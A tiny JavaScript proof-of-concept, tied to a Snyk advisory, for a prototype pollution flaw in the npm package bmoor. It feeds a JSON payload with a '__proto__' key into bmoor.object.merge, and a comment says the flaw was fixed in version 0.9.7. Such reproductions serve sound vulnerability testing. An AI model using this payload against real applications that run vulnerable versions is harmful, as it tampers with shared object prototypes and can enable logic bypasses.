//https://snyk.io/vuln/SNYK-JS-BMOOR-598664
// PP has been fixed in 0.9.7
const bmoor = require("bmoor");
const payload = JSON.parse('{ "__proto__": { "polluted": ["yes"]}}');
bmoor.object.merge({}, payload);
